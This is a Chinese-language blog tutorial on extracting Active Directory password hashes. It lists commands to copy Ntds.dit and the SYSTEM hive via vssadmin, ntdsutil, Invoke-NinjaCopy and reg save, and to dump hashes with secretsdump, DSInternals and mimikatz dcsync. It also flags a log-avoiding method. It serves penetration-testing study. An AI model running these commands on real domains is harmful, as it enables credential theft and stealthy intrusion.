        <content type="html"><![CDATA[<h3 id="1、hash存放"><a href="#1、hash存放" class="headerlink" title="1、hash存放"></a>1、hash存放</h3><p>C:\Windows\NTDS\Ntds.dit存放包括但不限于有关域用户、域组、用户hash等信息。其中域用户的密码hash由存储在system注册表配置单元中的密钥进行二次加密。</p><p>而在工作组环境下用户密码等信息存储在SAM文件中，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。和SAM文件一样，Ntds.dit是默认被Windows系统锁定的。</p><h3 id="2、ntds-dit获取"><a href="#2、ntds-dit获取" class="headerlink" title="2、ntds.dit获取"></a>2、ntds.dit获取</h3><p>上文知ntds.dit文件被Windows锁定，必须要利用卷影拷贝服务*(Volume Shadow Copy Service，VSS)*才能获取该文件的副本。VSS本质上是属于快照技术的一种，主要用于备份和恢复，即使目标文件被处于锁定状态。</p><p>获取ntds.dit副本步骤如下：</p><ol><li>创建目标主机的卷影拷贝（包含Windows上的全部文件）</li><li>然后在创建的卷影拷贝中将ntds.dit复制出来</li><li>最后将当菜创建的卷影拷贝删除</li></ol><h4 id="windows原生vssadmin工具"><a href="#windows原生vssadmin工具" class="headerlink" title="windows原生vssadmin工具"></a>windows原生vssadmin工具</h4><p>vssadmin是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝。*(适用范围Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008)*</p><p>以下操作需要域管权限：</p><p>1）首先创建C盘的卷影副本</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow /for=C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629103236252.png" alt="image-20210629103236252"></p><p>2）将ntds.dit文件从卷影副本中拷贝出来，而后删除卷影副本即可</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629103756810.png" alt="image-20210629103756810"></p><h4 id="通过vbs脚本"><a href="#通过vbs脚本" class="headerlink" title="通过vbs脚本"></a>通过vbs脚本</h4><p>脚本地址：<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>该脚本本质上通过wmi对shadowcopy进行操作的，与vssadmin类似，命令的流程：启动-创建卷影副本-拷贝ntds.dit-根据ID删除卷影副本</p><pre class="line-numbers language-none"><code class="language-none">cscript Desktop\vssown.vbs /start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629110100489.png" alt="image-20210629110100489"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629110325908.png" alt="image-20210629110325908"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629110751660.png" alt="image-20210629110751660"></p><p>同样使用wmi实现vss(卷影拷贝服务)还有powershell脚本：<a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</a></p><h4 id="原生工具Ntdsutil-exe创建快照"><a href="#原生工具Ntdsutil-exe创建快照" class="headerlink" title="原生工具Ntdsutil.exe创建快照"></a>原生工具Ntdsutil.exe创建快照</h4><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，不仅可以本地操作域控主机，还可以通过域内主机在域控上远程操作(需要域管权限)</p><p>以下操作需要域管权限：</p><p>1）为主机创建一个包含所有文件的快照，该快照中的文件在复制时同样不受windows锁定机制的影响。创建之后需要通过ID将快照挂在在磁盘中</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &lt;ID&gt;" quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629112333076.png" alt="image-20210629112333076"></p><p>2）复制出ntds.dit后，取消快照挂载并删除快照</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629112619433.png" alt="image-20210629112619433"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629155406474.png" alt="image-20210629155406474"></p><h4 id="创建IFM提取Ntds-dit文件"><a href="#创建IFM提取Ntds-dit文件" class="headerlink" title="创建IFM提取Ntds.dit文件"></a>创建IFM提取Ntds.dit文件</h4><p>在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件，需要管理员权限。</p><p>创建ifm，目录名为test，创建后访问test目录能看到ntds.dit和SYSTEM文件，复制出来后删除test目录即可</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil "ac i ntds" "ifm" "create full c:/test" q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629162245431.png" alt="image-20210629162245431"></p><h4 id="PowerSploit中的Invoke-NinjaCopy脚本"><a href="#PowerSploit中的Invoke-NinjaCopy脚本" class="headerlink" title="PowerSploit中的Invoke-NinjaCopy脚本"></a>PowerSploit中的Invoke-NinjaCopy脚本</h4><p>地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><p>该脚本用于“万能复制”，像windows主机里SAM文件、域控中的Ntds.dit，里面数据很多有价值的信息，普通的COPY命令是无法复制的，使用万能复制可以复制这类文件。</p><p>该脚本通过读取原始卷并解析NTFS结构，从NTFS分区卷复制文件。</p><p>使用方法：</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\ntds.dit"Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\system.hive"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>★★★ <strong>这种方法没有调用Volume Shadow Copy服务，所以不会产生系统日志文件7036(卷影拷贝服务进入运行状态的标志)。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629170658418.png" alt="image-20210629170658418"></p><h3 id="3、SYSTEM文件获取"><a href="#3、SYSTEM文件获取" class="headerlink" title="3、SYSTEM文件获取"></a>3、SYSTEM文件获取</h3><p>SYSTEM中保存ntds.dit的加密密钥，且同样需要绕过windows锁对其读写</p><p>获取ntds.dit文件的相关方法同样适用于此，也可以使用reg命令提取：</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、导出ntds-dit中的hash"><a href="#4、导出ntds-dit中的hash" class="headerlink" title="4、导出ntds.dit中的hash"></a>4、导出ntds.dit中的hash</h3><h4 id="Impacket中的secretsdump"><a href="#Impacket中的secretsdump" class="headerlink" title="Impacket中的secretsdump"></a>Impacket中的secretsdump</h4><p>该脚本可远程dump出域控主机的ntds.dit文件中的hash，也可以本地使用</p><p><strong>PS：该脚本默认使用的是drsuapi，此类api实现目录复制服务远程协议Directory Replication Service (DRS) Remote Protocol</strong></p><p>本地导出system.hive和ntds.dit文件进行测试如下：</p><pre class="line-numbers language-none"><code class="language-none">python3 examples/secretsdump.py -system winhash/system.hive -ntds winhash/ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629210600399.png" alt="image-20210629210600399"></p><p>secretsdump.py默认使用的drsuapi导出，设置选项也支持vss方式导出</p><h4 id="DSInternals-PowerShell模块"><a href="#DSInternals-PowerShell模块" class="headerlink" title="DSInternals PowerShell模块"></a>DSInternals PowerShell模块</h4><p>powershell 5版本以上的直接使用命令安装</p><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5以下版本的下载release通过import-module使用</p><p>Ps: powershell一般有执行策略限制，如果导入报警需要使用命令设置策略宽松，如下</p><pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy unRestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而后就可以导入模块，跑出SYSTEM中的密钥，而后跑出用户hash</p><pre class="line-numbers language-none"><code class="language-none">Get-Bootkey -SystemHivePath "C:\Users\xxx\Desktop\fotest\SYSTEM"Get-ADDBAccount -All -DBPath 'C:\Users\xxx\Desktop\fotest\ntds.dit' -Bootkey &lt;KEY&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629220010099.png" alt="image-20210629220010099"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629220448493.png" alt="image-20210629220448493"></p><h4 id="mimikatz在线提取"><a href="#mimikatz在线提取" class="headerlink" title="mimikatz在线提取"></a>mimikatz在线提取</h4><p>mimikatz中利用dcsync可提取域控上Ntds.dit中的hash，该方法需要域管权限，在任意域内机器上使用。</p><p>在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据，如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，模仿一个域控，从真实的域控中请求数据，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。</p><p>使用命令：</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync /domain:xxx.com (/user:administrator) /all /csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210701090342107.png" alt="image-20210701090342107"></p><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>写完啦，东拼西凑做了个小总结，算是一个复现吧，由于刚刚学习网知识，有不正确的地方请指正</p><h5 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h5><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync</a></p><p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>]]></content>
      
      
      <categories>
          
          <category> windows内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> vssadmin </tag>
            
            <tag> mimikatz </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
